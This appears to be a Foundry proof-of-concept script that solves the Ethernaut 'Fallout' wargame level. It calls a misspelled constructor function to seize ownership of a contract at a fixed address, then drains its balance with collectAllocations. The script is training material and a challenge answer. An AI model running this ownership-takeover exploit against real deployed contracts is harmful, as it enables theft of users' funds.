// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level2.sol";

contract POC is Script {
    Fallout level2 = Fallout(0xE7BF174251463369a767dA217eD097ff98F5BDc6);

    function run() external {
        vm.startBroadcast();

        level2.Fal1out{value: 1 wei}();
        level2.collectAllocations();

        vm.stopBroadcast();
    }
}
